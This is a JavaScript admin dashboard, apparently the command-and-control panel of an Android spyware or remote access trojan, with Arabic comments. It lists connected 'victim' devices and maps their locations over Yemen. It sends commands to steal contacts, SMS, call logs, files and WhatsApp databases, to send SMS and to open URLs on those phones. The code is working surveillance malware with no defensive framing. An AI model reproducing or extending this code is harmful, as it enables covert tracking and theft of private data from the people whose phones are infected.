const socket = io();
socket.emit('adminJoin');

let devices = {};
let deviceMarkers = {};

// إعداد الخريطة
const map = L.map('map').setView([15.3694, 44.1910], 6); // اليمن
L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
    attribution: '&copy; OpenStreetMap contributors'
}).addTo(map);

// استقبال الأجهزة المتصلة
socket.on('join', device => {
    devices[device.id] = device;
    updateDeviceList();
    addLog(`جهاز متصل: ${device.id} (${device.model})`);
});

// استقبال الموقع
socket.on('getLocation', data => {
    if(devices[data.id]){
        const {lat, lon} = data.data;
        if(deviceMarkers[data.id]) map.removeLayer(deviceMarkers[data.id]);

        // عرض الأجهزة على شكل دائرة استخباراتية
        deviceMarkers[data.id] = L.circle([lat, lon], {
            color: '#00ffcc',
            fillColor: '#00ffcc33',
            fillOpacity: 0.4,
            radius: 500
        }).addTo(map).bindPopup(`${data.id} (${devices[data.id].model})`).openPopup();
    }
});

// استقبال الردود من الأجهزة
const victimEvents = ['getDir','getInstalledApps','getContacts','sendSMS',
                      'getCallLog','previewImage','getSMS','getLocation',
                      'download','downloadWhatsappDatabase','openUrl','downloadFile'];

victimEvents.forEach(ev => {
    socket.on(ev, data => addLog(`رد من الجهاز: ${ev} => ${JSON.stringify(data)}`));
});

// قطع الاتصال
socket.on('disconnectClient', socketId => {
    for(let id in devices){
        if(devices[id].socketId === socketId){
            addLog(`انقطع الاتصال بالجهاز: ${id}`);
            if(deviceMarkers[id]) map.removeLayer(deviceMarkers[id]);
            delete devices[id];
            updateDeviceList();
            break;
        }
    }
});

function updateDeviceList(){
    const ul = document.getElementById('deviceList');
    const select = document.getElementById('deviceSelect');
    ul.innerHTML = '';
    select.innerHTML = '';
    Object.values(devices).forEach(d => {
        const li = document.createElement('li');
        li.innerHTML = `
            <span>${d.id} (${d.model})</span>
            <div>
                <button onclick="sendCommand('${d.id}','getContacts')">جهات الاتصال</button>
                <button onclick="sendCommand('${d.id}','getInstalledApps')">التطبيقات</button>
                <button onclick="sendCommand('${d.id}','getLocation')">الموقع</button>
            </div>
        `;
        ul.appendChild(li);

        const opt = document.createElement('option');
        opt.value = d.id;
        opt.textContent = `${d.id} (${d.model})`;
        select.appendChild(opt);
    });
}

function addLog(msg){
    const ul = document.getElementById('logList');
    const li = document.createElement('li');
    li.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
    ul.appendChild(li);
    ul.scrollTop = ul.scrollHeight;
}

document.getElementById('sendCommand').addEventListener('click', () => {
    const to = document.getElementById('deviceSelect').value;
    const action = document.getElementById('commandAction').value;
    let data = document.getElementById('commandData').value.trim();
    if(data){
        try { data = JSON.parse(data); }
        catch(e){ addLog('خطأ: بيانات الأمر ليست JSON صحيحة'); return; }
    } else data = null;
    sendCommand(to, action, data);
});

function sendCommand(to, action, data=null){
    socket.emit('request', JSON.stringify({to, action, data}));
    addLog(`تم إرسال الأمر: ${action} إلى ${to}`);
}
